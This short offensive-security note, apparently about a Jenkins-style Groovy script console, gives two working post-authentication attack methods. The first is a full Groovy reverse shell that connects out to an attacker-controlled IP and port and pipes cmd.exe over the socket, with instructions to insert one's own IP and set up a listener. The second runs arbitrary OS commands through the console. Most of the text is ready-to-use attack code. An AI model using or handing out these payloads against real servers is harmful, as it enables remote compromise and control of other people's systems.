- - -
## Method 1 : ( Rev Shell )

- First you have take **admin** access.
-  Go to [http://example.com/script](http://example.com/script)
- Here you can type in an **<mark style="background: #FF5582A6;">arbitrary Groovy script</mark>** and execute it on the server.
```groovy
String host="10.8.0.239";  
int port=8044;  
String cmd="cmd.exe";  
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Change the **host's** value with your IP. and Set-up a listner. and have a shell.


- - - 
## Method 2 : (Command Execution )

Use This groovy script to execute direct commands from the script console.
-  First you have take **admin** access.
-  Goto [http://example.com/script](http://example.com/script)
-  Change the **ipconfig** with **your command**.
```Groovy
def sout = new StringBuffer(), serr = new StringBuffer()  
def proc = 'ipconfig'.execute()  
proc.consumeProcessOutput(sout, serr)  
proc.waitForOrKill(1000)  
println "out> $sout err> $serr"
```

